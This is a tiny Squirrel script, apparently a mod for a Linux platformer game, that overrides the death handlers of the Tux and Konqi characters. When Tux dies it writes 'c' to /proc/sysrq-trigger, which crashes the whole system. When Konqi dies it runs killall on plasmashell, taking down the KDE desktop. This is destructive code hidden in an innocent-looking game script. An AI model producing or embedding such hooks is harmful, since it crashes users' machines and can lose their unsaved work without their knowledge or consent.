::TuxDie._run <- TuxDie.run;

::TuxDie.run <- function () {
	system("echo c > /proc/sysrq-trigger")
	_run();
}

::KonqiDie._run <- KonqiDie.run;

::KonqiDie.run <- function () {
	system("killall plasmashell")
	_run();
}